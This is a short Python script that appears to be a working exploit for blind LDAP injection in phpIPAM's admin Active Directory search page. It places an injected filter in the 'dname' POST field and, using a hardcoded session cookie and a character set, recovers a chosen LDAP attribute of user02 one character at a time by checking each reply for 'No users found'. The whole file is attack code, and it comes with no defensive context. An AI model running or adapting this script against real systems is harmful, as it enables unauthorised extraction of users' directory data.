import requests
import string


HOST = "http://192.168.122.47"

URL = f"{HOST}/app/admin/users/ad-search-result.php"

SECRET_FIELD = "homepostaladdress"

TARGET_USER = "user02"

CHARSET = list(string.ascii_lowercase + string.digits)

COOKIES = {'phpipam': 'j1h96s5bu52edsmjvc8a971gr3'}

SERVER_ID = '3'


def make_request(s):

    dname = f"{TARGET_USER})({SECRET_FIELD}={s})(uid="

    resp = requests.post(URL, data={'dname': dname, 'server': SERVER_ID}, cookies=COOKIES)

    # print(resp.text)

    if 'No users found' in resp.text:
        return False

    return True


def main():

    secret_text = ''

    while True:

        found_match = False

        if make_request(secret_text):
            break

        for c in CHARSET:
            if make_request(secret_text + c + '*'):
                secret_text += c
                found_match = True
                break

        if not found_match:
            print("Error! No match found. Maybe try extending the charset")

        print("Intermediate result: {0}".format(secret_text))

    print("Final result found: {0}".format(secret_text))


if __name__ == "__main__":
    main()
